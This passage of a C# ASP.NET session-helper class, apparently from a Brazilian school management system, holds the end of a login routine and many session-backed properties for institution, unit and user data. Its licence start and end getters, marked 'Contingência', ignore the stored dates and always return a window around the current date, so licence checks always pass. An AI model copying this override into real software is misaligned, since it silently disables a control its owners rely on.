                                                            lTb03.CO_COL,
                                                            lTb03.NO_COL,
                                                            lTb03.CO_MAT_COL,
                                                            lTb03.CO_FUN,
                                                            lTb03.ORG_CODIGO_ORGAO,
                                                            lTb03.TB25_EMPRESA.NO_FANTAS_EMP,
                                                            lTb03.FLA_PROFESSOR,
                                                            lTb03.FL_USR_DEMO,
                                                            lTb03.DT_INI_USR_DEMO,
                                                            lTb03.DT_FIN_USR_DEMO,
                                                            lTb03.CO_DEPTO,
                                                            ImageId = (lTb03.Image != null) ? lTb03.Image.ImageId : 0
                                                        }).FirstOrDefault();

                                            if (tb03 != null)
                                            {
                                                int orgCodigoOrgao = int.TryParse(tb03.ORG_CODIGO_ORGAO.ToString(), out orgCodigoOrgao) ? orgCodigoOrgao : 0;
                                                //--------------------------------------------> Código do Funcionário Logado
                                                CO_DEPTO = tb03.CO_DEPTO.HasValue ? tb03.CO_DEPTO.Value : 0;

                                                //--------------------------------------------> Código do Funcionário Logado
                                                CO_COL = tb03.CO_COL;

                                                //--------------------------------------------> Tipo do professor logado
                                                FLA_PROFESSOR = tb03.FLA_PROFESSOR;

                                                //--------------------------------------------> Nome da Empresa Funcional do Funcionário Logado
                                                NO_FANTAS_EMP = tb03.NO_FANTAS_EMP;

                                                //--------------------------------------------> Imagem do Funcionário Logado
                                                ID_IMG_USU_LOGADO = tb03.ImageId;

                                                //--------------------------------------------> Nome do Usuário Logado
                                                NOME_USU_LOGADO = tb03.NO_COL;

                                                //--------------------------------------------> Código da Matrícula do Funcionário Logado
                                                CO_MAT_COL = tb03.CO_MAT_COL;

                                                //--------------------------------------------> Tipo do usuário logado
                                                FLA_USR_DEMO = tb03.FL_USR_DEMO;

                                                //--------------------------------------------> Período inicial do usuário DEMO logado
                                                DATA_INICIO_USU_DEMO = tb03.DT_INI_USR_DEMO.HasValue ? tb03.DT_INI_USR_DEMO.Value : DateTime.Now;

                                                //--------------------------------------------> Período final do usuário DEMO logado
                                                DATA_FINAL_USU_DEMO = tb03.DT_FIN_USR_DEMO.HasValue ? tb03.DT_FIN_USR_DEMO.Value : DateTime.Now;

                                                //--------------------------------------------> Código da Instituição do Funcionário Logado
                                                ORG_CODIGO_ORGAO = orgCodigoOrgao;

                                                //--------------------------------------------> Recebe nome da função do Funcionário Logado
                                                NOME_FUNCAO_USU = (from tb15 in TB15_FUNCAO.RetornaTodosRegistros()
                                                                               where tb15.CO_FUN.Equals(tb03.CO_FUN)
                                                                               select new { tb15.NO_FUN }).FirstOrDefault().NO_FUN;

                                                //--------------------------------------------> Faz a atualização do acesso
                                                AtualizaAcesso();

                                                retorno.mostrarDivFuncionalidade = false;
                                                //--------------------------------------------> Faz o redirecionamento para a página DEFAULT
                                                retorno.nomeUsuarioLogado = NOME_USU_LOGADO;
                                                retorno.redirecionarDefault = true;
                                                retorno.resultado = true;
                                                return retorno;
                                            }
                                        }
                                        else
                                        {
                                            retorno.mostrarDivFuncionalidade = false;
                                            retorno.labelErro = "Usuário sem perfil associado, contate o administrador do sistema.";
                                            retorno.mostrarDivErro = true;
                                            retorno.resultado = false;
                                            return retorno;
                                        }
                                    }
                                    else
                                    {
                                        retorno.mostrarDivFuncionalidade = false;
                                        retorno.labelErro = "Acesso negado, Favor verifique com administrador do sistema.";
                                        retorno.mostrarDivErro = true;
                                        retorno.resultado = false;
                                        return retorno;
                                    }
                                }
                            }
                            else
                            {
                                retorno.mostrarDivFuncionalidade = false;
                                retorno.labelErro = "Acesso negado, Favor verifique com Administrador do sistema.";
                                retorno.mostrarDivErro = true;
                                retorno.resultado = false;
                                return retorno;
                            }
                        }
                    }
                }
                retorno.resultado = true;
            }
            catch(Exception e)
            {
                retorno.resultado = false;
                retorno.exErro = e.Message;
            }
            return retorno;
        }

        #region Dados da Instituição do Usuário Logado -> "TB000_INSTITUICAO"

        /// <summary>
        /// Código da Instituição do Usuário Logado
        /// </summary>
        public static Int32 ORG_CODIGO_ORGAO
        {
            get
            {
                int intOrgCodigoOrgao = 0;

                if (HttpContext.Current.Session["ORG_CODIGO_ORGAO"] != null)
                    intOrgCodigoOrgao = (int)HttpContext.Current.Session["ORG_CODIGO_ORGAO"];

                return intOrgCodigoOrgao;
            }
            set
            {
                HttpContext.Current.Session.Remove("ORG_CODIGO_ORGAO");
                HttpContext.Current.Session.Add("ORG_CODIGO_ORGAO", value);
            }
        }
        /// <summary>
        /// Data do Início da validade da licença
        /// </summary>
        public static DateTime DtInicioLicenca
        {
            get
            {
                DateTime dtInicioLicenca = DateTime.MaxValue;

                if (HttpContext.Current.Session["DtInicioLicenca"] != null)
                    dtInicioLicenca = (DateTime)HttpContext.Current.Session["DtInicioLicenca"];

//========================================>Contingência
                DateTime dtIniLi = DateTime.Now.AddMonths(-1);
                //return dtInicioLicenca;
                return dtIniLi;
            }
            set
            {
                HttpContext.Current.Session.Remove("DtInicioLicenca");
                HttpContext.Current.Session.Add("DtInicioLicenca", value);
            }
        }
        /// <summary>
        /// Data do Fim da validade da licença
        /// </summary>
        public static DateTime DtFimLicenca
        {
            get
            {
                DateTime dtFimLicenca = DateTime.MinValue;

                if (HttpContext.Current.Session["DtFimLicenca"] != null)
                    dtFimLicenca = (DateTime)HttpContext.Current.Session["DtFimLicenca"];

//========================================>Contingência
                DateTime dtFimLi = DateTime.Now.AddMonths(+1);
                //return dtFimLicenca;
                return dtFimLi;
            }
            set
            {
                HttpContext.Current.Session.Remove("DtFimLicenca");
                HttpContext.Current.Session.Add("DtFimLicenca", value);
            }
        }  
        /// <summary>
        /// Nome da Instituição do Usuário Logado
        /// </summary>
        public static string ORG_NOME_ORGAO
        {
            get
            {
                return (string)HttpContext.Current.Session["ORG_NOME_ORGAO"];
            }
            set
            {
                HttpContext.Current.Session.Remove("ORG_NOME_ORGAO");
                HttpContext.Current.Session.Add("ORG_NOME_ORGAO", value);
            }
        }
        /// <summary>
        /// Nome da Instituição do Usuário Logado
        /// </summary>
        public static decimal ORG_NUMERO_CNPJ
        {
            get
            {
                return (decimal)HttpContext.Current.Session["ORG_NUMERO_CNPJ"];
            }
            set
            {
                HttpContext.Current.Session.Remove("ORG_NUMERO_CNPJ");
                HttpContext.Current.Session.Add("ORG_NUMERO_CNPJ", value);
            }
        }
        /// <summary>
        /// Código UF da Instituição do Usuário Logado
        /// </summary>
        public static string CO_UF_INSTITUICAO
        {
            get
            {
                return (string)HttpContext.Current.Session["CO_UF_INSTITUICAO"];
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_UF_INSTITUICAO");
                HttpContext.Current.Session.Add("CO_UF_INSTITUICAO", value);
            }
        }
        /// <summary>
        /// Código da Cidade da Instituição do Usuário Logado
        /// </summary>
        public static Int32 CO_CIDADE_INSTITUICAO
        {
            get
            {
                int intCoCidadeInstituicao = 0;
                if (HttpContext.Current.Session["CO_CIDADE_INSTITUICAO"] != null)
                    intCoCidadeInstituicao = (int)HttpContext.Current.Session["CO_CIDADE_INSTITUICAO"];
                return intCoCidadeInstituicao;
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_CIDADE_INSTITUICAO");
                HttpContext.Current.Session.Add("CO_CIDADE_INSTITUICAO", value);
            }
        }
        /// <summary>
        /// Nome da Cidade da Instituição do Usuário Logado
        /// </summary>
        public static string NO_CIDADE_INSTITUICAO
        {
            get
            {
                return (string)HttpContext.Current.Session["NO_CIDADE_INSTITUICAO"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NO_CIDADE_INSTITUICAO");
                HttpContext.Current.Session.Add("NO_CIDADE_INSTITUICAO", value);
            }
        }
        #endregion

        #region Dados da Unidade do Usuário Logado -> "TB25_EMPRESA"

        /// <summary>
        /// Código da Unidade Funcional "DEFAULT"
        /// </summary>
        public static int CO_UNID_FUNC
        {
            get
            {
                int intCoUnidFunc = 0;

                if (HttpContext.Current.Session["CO_UNID_FUNC"] != null)
                    if (!String.IsNullOrEmpty(HttpContext.Current.Session["CO_UNID_FUNC"].ToString()))
                        int.TryParse(HttpContext.Current.Session["CO_UNID_FUNC"].ToString(), out intCoUnidFunc);

                return intCoUnidFunc;
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_UNID_FUNC");
                HttpContext.Current.Session.Add("CO_UNID_FUNC", value);
            }
        }
        /// <summary>
        /// Código da Unidade Logada
        /// </summary>
        public static int CO_EMP
        {
            get
            {
                int intCoEmp = 0;

                if (HttpContext.Current.Session["CO_EMP"] != null)
                    if (!String.IsNullOrEmpty(HttpContext.Current.Session["CO_EMP"].ToString()))
                        int.TryParse(HttpContext.Current.Session["CO_EMP"].ToString(), out intCoEmp);

                return intCoEmp;
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_EMP");
                HttpContext.Current.Session.Add("CO_EMP", value);
            }
        }
        /// <summary>
        /// Código do Local Logada
        /// </summary>
        public static int CO_DEPTO
        {
            get
            {
                int intCoDepto = 0;

                if (HttpContext.Current.Session["CO_DEPTO"] != null)
                    if (!String.IsNullOrEmpty(HttpContext.Current.Session["CO_DEPTO"].ToString()))
                        int.TryParse(HttpContext.Current.Session["CO_DEPTO"].ToString(), out intCoDepto);

                return intCoDepto;
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_DEPTO");
                HttpContext.Current.Session.Add("CO_DEPTO", value);
            }
        }
        /// <summary>
        /// Código do Tipo da Unidade Logada
        /// </summary>
        public static string CO_TIPO_UNID
        {
            get
            {
                return (string)HttpContext.Current.Session["CO_TIPO_UNID"];
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_TIPO_UNID");
                HttpContext.Current.Session.Add("CO_TIPO_UNID", value);
            }
        }

        /// <summary>
        /// Código da unidade Logada
        /// </summary>
        public static int CO_UNID
        {
            get
            {
                int intCoEmp = 0;

                if (HttpContext.Current.Session["CO_UNID"] != null)
                    if (!String.IsNullOrEmpty(HttpContext.Current.Session["CO_UNID"].ToString()))
                        int.TryParse(HttpContext.Current.Session["CO_UNID"].ToString(), out intCoEmp);

                return intCoEmp;
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_UNID");
                HttpContext.Current.Session.Add("CO_UNID", value);
            }
        }
        /// <summary>
        /// Nome Fantasia da Unidade Logada
        /// </summary>
        public static string NO_FANTAS_EMP_ALTERADA
        {
            get
            {
                return (string)HttpContext.Current.Session["NO_FANTAS_EMP_ALTERADA"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NO_FANTAS_EMP_ALTERADA");
                HttpContext.Current.Session.Add("NO_FANTAS_EMP_ALTERADA", value);
            }
        }
        /// <summary>
        /// Nome Fantasia da Unidade Funcional "DEFAULT"
        /// </summary>
        public static string NO_FANTAS_EMP
        {
            get
            {
                return (string)HttpContext.Current.Session["NO_FANTAS_EMP"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NO_FANTAS_EMP");
                HttpContext.Current.Session.Add("NO_FANTAS_EMP", value);
            }
        }
        /// <summary>
        /// Cidade da Unidade Funcional "DEFAULT"
        /// </summary>
        public static string NO_CIDADE_EMP
        {
            get
            {
                return (string)HttpContext.Current.Session["NO_CIDADE_EMP"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NO_CIDADE_EMP");
                HttpContext.Current.Session.Add("NO_CIDADE_EMP", value);
            }
        }
        /// <summary>
        /// Estado da Unidade Funcional "DEFAULT"
        /// </summary>
        public static string CO_UF_EMP
        {
            get
            {
                return (string)HttpContext.Current.Session["CO_UF_EMP"];
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_UF_EMP");
                HttpContext.Current.Session.Add("CO_UF_EMP", value);
            }
        }
        /// <summary>
        /// Telefone da Unidade Funcional "DEFAULT"
        /// </summary>
        public static string TELEFONE_EMP
        {
            get
            {
                return (string)HttpContext.Current.Session["TELEFONE_EMP"];
            }
            set
            {
                HttpContext.Current.Session.Remove("TELEFONE_EMP");
                HttpContext.Current.Session.Add("TELEFONE_EMP", value);
            }
        }
        /// <summary>
        /// ID da Imagem da Empresa Logada
        /// </summary>
        public static int? ID_IMG_EMPRESA_LOGADA
        {
            get
            {
                return (int?)HttpContext.Current.Session["ID_IMG_EMPRESA_LOGADA"];
            }
            set
            {
                HttpContext.Current.Session.Remove("ID_IMG_EMPRESA_LOGADA");
                HttpContext.Current.Session.Add("ID_IMG_EMPRESA_LOGADA", value);
            }
        }
        /// <summary>
        /// Tipo de Ponto (Professor)
        /// </summary>
        public static string TP_PONTO_PROF
        {
            get
            {
                return (string)HttpContext.Current.Session["TP_PONTO_PROF"];
            }
            set
            {
                HttpContext.Current.Session.Remove("TP_PONTO_PROF");
                HttpContext.Current.Session.Add("TP_PONTO_PROF", value);
            }
        }
        /// <summary>
        /// Tipo de Ponto (Funcionário)
        /// </summary>
        public static string TP_PONTO_FUNC
        {
            get
            {
                return (string)HttpContext.Current.Session["TP_PONTO_FUNC"];
            }
            set
            {
                HttpContext.Current.Session.Remove("TP_PONTO_FUNC");
                HttpContext.Current.Session.Add("TP_PONTO_FUNC", value);
            }
        }
        #endregion

        #region Dados do Usuário Logado -> "ADMUSUARIO" e "TBLOGIN"

        /// <summary>
        /// ID do Usuário Logado 
        /// </summary>
        public static int IDEADMUSUARIO
        {
            get
            {
                int intIdeAdmUsuario = 0;
                if (HttpContext.Current.Session["IDEADMUSUARIO"] != null)
                    intIdeAdmUsuario = (int)HttpContext.Current.Session["IDEADMUSUARIO"];
                return intIdeAdmUsuario;
            }
            set
            {
                HttpContext.Current.Session.Remove("IDEADMUSUARIO");
                HttpContext.Current.Session.Add("IDEADMUSUARIO", value);
            }
        }
        /// <summary>
        /// Login do Usuário Logado 
        /// </summary>
        public static string DESLOGIN
        {
            get
            {
                string strDesLogin = "";
                if (HttpContext.Current.Session["DESLOGIN"] != null)
                    strDesLogin = (string)HttpContext.Current.Session["DESLOGIN"];
                return strDesLogin;
            }
            set
            {
                HttpContext.Current.Session.Remove("DESLOGIN");
                HttpContext.Current.Session.Add("DESLOGIN", value);
            }
        }
        /// <summary>
        /// Nome Completo do Usuário Logado 
        /// </summary>
        public static string NOME_USU_LOGADO
        {
            get
            {
                string strNomeUsuarioLogado = "";
                if (HttpContext.Current.Session["NOME_USU_LOGADO"] != null)
                    strNomeUsuarioLogado = (string)HttpContext.Current.Session["NOME_USU_LOGADO"];
                return strNomeUsuarioLogado;
            }
            set
            {
                HttpContext.Current.Session.Remove("NOME_USU_LOGADO");
                HttpContext.Current.Session.Add("NOME_USU_LOGADO", value);
            }
        }
        /// <summary>
        /// ID da Imagem do Usuário Logado
        /// </summary>
        public static Int32 ID_IMG_USU_LOGADO
        {
            get
            {
                int intImgColaborLogado = 0;

                if (HttpContext.Current.Session["ID_IMG_USU_LOGADO"] != null)
                    intImgColaborLogado = (int)HttpContext.Current.Session["ID_IMG_USU_LOGADO"];

                return intImgColaborLogado;
            }
            set
            {
                HttpContext.Current.Session.Remove("ID_IMG_USU_LOGADO");
                HttpContext.Current.Session.Add("ID_IMG_USU_LOGADO", value);
            }
        }
        /// <summary>
        /// Flag de Reabertura de Solicitação Global
        /// </summary>
        public static string FLA_REABER_SOLICI_GLOBAL
        {
            get
            {
                string strFlaReaberSoliciGlobal = "";
                if (HttpContext.Current.Session["FLA_REABER_SOLICI_GLOBAL"] != null)
                    strFlaReaberSoliciGlobal = (string)HttpContext.Current.Session["FLA_REABER_SOLICI_GLOBAL"];
                return strFlaReaberSoliciGlobal;
            }
            set
            {
                HttpContext.Current.Session.Remove("FLA_REABER_SOLICI_GLOBAL");
                HttpContext.Current.Session.Add("FLA_REABER_SOLICI_GLOBAL", value);
            }
        }
        /// <summary>
        /// Flag de alteração da Bolsa/Convenio do usuário
        /// </summary>
        public static string FLA_ALT_BOL_ALU
        {
            get
            {
                string strFlaAltBolAlu = "";
                if (HttpContext.Current.Session["FLA_ALT_BOL_ALU"] != null)
                    strFlaAltBolAlu = (string)HttpContext.Current.Session["FLA_ALT_BOL_ALU"];
                return strFlaAltBolAlu;
            }
            set
            {
                HttpContext.Current.Session.Remove("FLA_ALT_BOL_ALU");
                HttpContext.Current.Session.Add("FLA_ALT_BOL_ALU", value);
            }
        }
        /// <summary>
        /// Flag de Tipo de Usuário Logado
        /// </summary>
        public static string CLASSIFICACAO_USU_LOGADO
        {
            get
            {
                string strClassUsuarioLogado = "";
                if (HttpContext.Current.Session["CLASSIFICACAO_USU_LOGADO"] != null)
                    strClassUsuarioLogado = (string)HttpContext.Current.Session["CLASSIFICACAO_USU_LOGADO"];
                return strClassUsuarioLogado;
            }
            set
            {
                HttpContext.Current.Session.Remove("CLASSIFICACAO_USU_LOGADO");
                HttpContext.Current.Session.Add("CLASSIFICACAO_USU_LOGADO", value);
            }
        }
        /// <summary>
        /// Quantidade de Acessos ao Sistema pelo Usuário
        /// </summary>
        public static int QTD_ACESSO_USU
        {
            get
            {
                int intQtdAcessoUsuario = 0;
                if (HttpContext.Current.Session["QTD_ACESSO_USU"] != null)
                    intQtdAcessoUsuario = (int)HttpContext.Current.Session["QTD_ACESSO_USU"];
                return intQtdAcessoUsuario;
            }
            set
            {
                HttpContext.Current.Session.Remove("QTD_ACESSO_USU");
                HttpContext.Current.Session.Add("QTD_ACESSO_USU", value);
            }
        }
        /// <summary>
        /// Número IP do Usuário Logado
        /// </summary>
        public static string IP_USU
        {
            get
            {
                return HttpContext.Current.Request.UserHostAddress;
            }
        }
        /// <summary>
        /// Número IP do último acesso do Usuário Logado
        /// </summary>
        public static string IP_ULTIMO_ACESSO_USU
        {
            get
            {
                string strIPLastAcessoUsuario = "";
                if (HttpContext.Current.Session["IP_ULTIMO_ACESSO_USU"] != null)
                    strIPLastAcessoUsuario = (string)HttpContext.Current.Session["IP_ULTIMO_ACESSO_USU"];
                return strIPLastAcessoUsuario;
            }
            set
            {
                HttpContext.Current.Session.Remove("IP_ULTIMO_ACESSO_USU");
                HttpContext.Current.Session.Add("IP_ULTIMO_ACESSO_USU", value);
            }
        }
        /// <summary>
        /// Data do último acesso do Usuário Logado
        /// </summary>
        public static DateTime DATA_ULTIMO_ACESSO_USU
        {
            get
            {
                DateTime dtDataLastAcess = DateTime.Now;
                if (HttpContext.Current.Session["DATA_ULTIMO_ACESSO_USU"] != null)
                    dtDataLastAcess = (DateTime)HttpContext.Current.Session["DATA_ULTIMO_ACESSO_USU"];
                return dtDataLastAcess;
            }
            set
            {
                HttpContext.Current.Session.Remove("DATA_ULTIMO_ACESSO_USU");
                HttpContext.Current.Session.Add("DATA_ULTIMO_ACESSO_USU", value);
            }
        }
        #endregion        

        #region Dados do Funcionário Logado -> "TB03_COLABOR" e "ADMUSUARIOESPECIAL"

        /// <summary>
        /// Número da Matrícula do Funcionário
        /// </summary>
        public static string CO_MAT_COL
        {
            get
            {
                return (string)HttpContext.Current.Session["CO_MAT_COL"];
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_MAT_COL");
                HttpContext.Current.Session.Add("CO_MAT_COL", value);
            }
        }
        /// <summary>
        /// Código do Funcionário
        /// </summary>
        public static Int32 CO_COL
        {
            get
            {
                int intCoCol = 0;

                if (HttpContext.Current.Session["CO_COL"] != null)
                    intCoCol = (int)HttpContext.Current.Session["CO_COL"];

                return intCoCol;
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_COL");
                HttpContext.Current.Session.Add("CO_COL", value);
            }
        }
        /// <summary>
        /// Informa se a empresa logada se situa em local onde é usado nove dígitos nos telefones celulares.
        /// </summary>
        public static string FL_NONO_DIGITO_TELEF
        {
            get
            {
                return (string)HttpContext.Current.Session["FL_NONO_DIGITO_TELEF"];
            }
            set
            {
                HttpContext.Current.Session.Remove("FL_NONO_DIGITO_TELEF");
                HttpContext.Current.Session.Add("FL_NONO_DIGITO_TELEF", value);
            }
        }

        /// <summary>
        /// Tipo de usuário, se é professor ou não
        /// </summary>
        public static string FLA_PROFESSOR
        {
            get
            {
                return (string)HttpContext.Current.Session["FLA_PROFESSOR"];
            }
            set
            {
                HttpContext.Current.Session.Remove("FLA_PROFESSOR");
                HttpContext.Current.Session.Add("FLA_PROFESSOR", value);
            }
        }
        /// <summary>
        /// Nome da Função do Usuário Logado
        /// </summary>
        public static string NOME_FUNCAO_USU
        {
            get
            {
                return (string)HttpContext.Current.Session["NOME_FUNCAO_USU"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NOME_FUNCAO_USU");
                HttpContext.Current.Session.Add("NOME_FUNCAO_USU", value);
            }
        }
        /// <summary>
        /// Nome do Responsável pelo Usuário Especial
        /// </summary>
        public static string NOME_RESPONSAVEL_USU_ESPECIAL
        {
            get
            {
                return (string)HttpContext.Current.Session["NOME_RESPONSAVEL_USU_ESPECIAL"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NOME_RESPONSAVEL_USU_ESPECIAL");
                HttpContext.Current.Session.Add("NOME_RESPONSAVEL_USU_ESPECIAL", value);
            }
        }
        /// <summary>
        /// Número CPF do Usuário Especial
        /// </summary>
        public static string NU_CPF_USU_ESPECIAL
        {
            get
            {
                return (string)HttpContext.Current.Session["NU_CPF_USU_ESPECIAL"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NU_CPF_USU_ESPECIAL");
                HttpContext.Current.Session.Add("NU_CPF_USU_ESPECIAL", value);
            }
        }
        /// <summary>
        /// Número RG do Usuário Especial
        /// </summary>
        public static string NU_RG_USU_ESPECIAL
        {
            get
            {
                return (string)HttpContext.Current.Session["NU_RG_USU_ESPECIAL"];
            }
            set
            {
                HttpContext.Current.Session.Remove("NU_RG_USU_ESPECIAL");
                HttpContext.Current.Session.Add("NU_RG_USU_ESPECIAL", value);
            }
        }

        /// <summary>
        /// Tipo de usuário, se é DEMO ou não
        /// </summary>
        public static bool FLA_USR_DEMO
        {
            get
            {
                return (bool)HttpContext.Current.Session["FLA_USR_DEMO"];
            }
            set
            {
                HttpContext.Current.Session.Remove("FLA_USR_DEMO");
                HttpContext.Current.Session.Add("FLA_USR_DEMO", value);
            }
        }

        /// <summary>
        /// Data inicial do período do Usuário DEMO Logado
        /// </summary>
        public static DateTime DATA_INICIO_USU_DEMO
        {
            get
            {
                DateTime dtIniUsuDemo = DateTime.Now;
                if (HttpContext.Current.Session["DATA_INICIO_USU_DEMO"] != null)
                    dtIniUsuDemo = (DateTime)HttpContext.Current.Session["DATA_INICIO_USU_DEMO"];
                return dtIniUsuDemo;
            }
            set
            {
                HttpContext.Current.Session.Remove("DATA_INICIO_USU_DEMO");
                HttpContext.Current.Session.Add("DATA_INICIO_USU_DEMO", value);
            }
        }

        /// <summary>
        /// Data final do período do Usuário DEMO Logado
        /// </summary>
        public static DateTime DATA_FINAL_USU_DEMO
        {
            get
            {
                DateTime dtFinUsuDemo = DateTime.Now;
                if (HttpContext.Current.Session["DATA_FINAL_USU_DEMO"] != null)
                    dtFinUsuDemo = (DateTime)HttpContext.Current.Session["DATA_FINAL_USU_DEMO"];
                return dtFinUsuDemo;
            }
            set
            {
                HttpContext.Current.Session.Remove("DATA_FINAL_USU_DEMO");
                HttpContext.Current.Session.Add("DATA_FINAL_USU_DEMO", value);
            }
        }

        #endregion       

        #region Dados do Responsável Logado -> "TB108_RESPONSAVEL"

        /// <summary>
        /// Código do Responsável
        /// </summary>
        public static Int32 CO_RESP
        {
            get
            {
                int intCoResp = 0;

                if (HttpContext.Current.Session["CO_RESP"] != null)
                    intCoResp = (int)HttpContext.Current.Session["CO_RESP"];

                return intCoResp;
            }
            set
            {
                HttpContext.Current.Session.Remove("CO_RESP");
                HttpContext.Current.Session.Add("CO_RESP", value);
            }
        }

        // <summary>
        /// Tipo Usuário
        /// </summary>
        public static String TIPO_USU
        {
            get
            {
                string tipoUsu = "";

                if (HttpContext.Current.Session["TIPO_USU"] != null)
                    tipoUsu = (string)HttpContext.Current.Session["TIPO_USU"];

                return tipoUsu;
            }
            set
            {
                HttpContext.Current.Session.Remove("TIPO_USU");
                HttpContext.Current.Session.Add("TIPO_USU", value);
            }
        }

        #endregion

        #region Classe
        /// <summary>
        /// Classe para retorno de resultado do login, com todas as especificações de situações diferentes
        /// </summary>
        public class resultadoLogin
        {
            public bool? resultado { get; set; }
            public string mensagemErro { get; set; }
            public bool? redirecionarDefault { get; set; }
            public bool? mostrarDivFuncionalidade { get; set; }
            public bool? mostrarDivErro { get; set; }
            public string nomeUsuarioLogado { get; set; }
            public string labelErro { get; set; }
            public int? codigoOrgao { get; set; }
            public bool? mostrarLinhaLicenca { get; set; }
            public string leftDivErro { get; set; }
            public string exErro { get; set; }
        }
        #endregion
    }
}
